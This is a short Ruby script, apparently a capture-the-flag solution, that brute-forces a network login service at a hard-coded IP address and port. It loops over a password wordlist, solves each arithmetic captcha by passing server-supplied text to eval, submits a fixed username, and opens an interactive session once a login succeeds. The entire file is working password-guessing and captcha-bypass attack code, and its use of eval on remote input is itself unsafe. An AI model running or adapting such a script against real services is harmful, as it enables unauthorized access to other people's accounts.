#!/usr/bin/ruby
#

require 'socket'

USERNAME = "ejnorman84"
#USERNAME = "EricNorman84"

File.open( 'h_5.txt' ).readlines.each do |password|
  s = TCPSocket.new '157.230.179.99', 1337
  puts "Trying #{password}"
  s.gets
  s.gets
  captcha = s.gets
  puts "\tCaptcha = #{captcha} Answer = #{eval( /(\d+\s[\+-\/*]\s\d+)/.match( captcha )[ 0 ] )}"
  s.print "#{eval( /(\d+\s[\+-\/*]\s\d+)/.match( captcha )[ 0 ] )}\t"
  s.puts ""
  puts s.read 10
  puts USERNAME
  s.puts USERNAME
  puts s.read 10
  puts password
  s.puts password
  result = s.gets
  puts result
  if result =~ /Succ/
    while true
      print ">>"
      inp = gets
      s.puts inp
      puts s.gets
    end
  else
    s.close
  end
end

